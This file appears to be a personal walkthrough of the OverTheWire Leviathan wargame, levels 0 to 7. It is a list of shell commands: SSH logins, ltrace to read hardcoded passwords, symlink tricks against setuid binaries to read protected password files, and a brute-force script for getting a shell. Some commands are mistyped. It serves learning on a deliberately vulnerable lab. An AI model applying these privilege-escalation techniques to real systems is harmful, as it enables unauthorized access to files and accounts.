# Solution to Leviathan levels
# Leviathan 0 -> 1
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0
ls -al
cd .backup # Here we can see that leviathan1 was owner of the directory
ls -al
vim bookmarks.html # HTML is way too big, we'll need to find a specific thing related to leviathan1
cd ..
grep -rnw '/.backup' -e 'leviathan1'
vim /.backup/bookmarks.html # Go to line 1057

# Leviathan 1 -> 2
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
ls -al
file check
./check
ltrace ./check
./check #Password = sex
ls -al
whoami
cat /etc/leviathan_pass/leviathan2

# Leviathan 2 -> 3
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
ls -al
file printfile
./printfile
./printfile /etc/leviathan_pass/leviathan3
ltrace ./printfile
mkdir /tmp/zulu/ && touch /tmp/zulu/file \tmp.txt
cd /tmp/zulu
ltrace ./printfile file
ln -s /etc/leviathan_pass/leviathan3 /tmp/zulu/file
./printfile "file tmp.txt"

# Leviathan 3 -> 4
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
ls -al
file level3
./level3
ltrace ./level3 #strcmp() vuln. --> password for level 3 is simply snlprintf lol
./level3 # give pswd
whoami
cat /etc/leviathan_pass/leviathan4 #rofl

# Leviathan 4 -> 5
ssh leviathan4@leviathan.labs.overthewire.org -p 2223
ls -al
cd .trash
ls -al
file bin
./bin
# We get binaries, use an online converter and voila 

# Leviathan 5 -> 6 
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
ls -al
./leviathan5
echo "test" > /tmp.file.log
./leviathan5
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5 # SCORE

# Leviathan 6 -> 7
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
ls -al
./leviathan6
mkdir /tmp/zulu
vim /tmp/zulu/bruteforce.sh
cd tmp
cd zulu
./bruteforce.sh
# wait a moment for shell to appear
ls -al
whoami
cat /etc/leviathan_pass/leviathan7

 
